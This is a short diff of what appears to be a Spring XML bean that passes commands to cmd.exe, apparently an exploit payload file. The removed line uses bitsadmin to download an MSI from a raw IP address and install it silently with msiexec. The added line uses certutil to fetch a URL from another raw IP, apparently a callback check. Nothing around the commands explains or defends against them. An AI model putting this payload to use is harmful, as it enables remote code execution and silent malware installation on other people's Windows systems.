@@ -4,7 +4,7 @@
             <list>
                 <value>cmd.exe</value>
                 <value>/c</value>
-                <value>bitsadmin /transfer JobDown /download /priority normal http://151.247.22.37/sc/new.msi C:\Users\Public\setup.msi &amp;&amp; msiexec.exe /i C:\Users\Public\setup.msi /qn /norestart</value>
+                <value>certutil -urlcache -split -f http://2.25.92.215:8090/hit_check</value>
             </list>
         </constructor-arg>
     </bean>
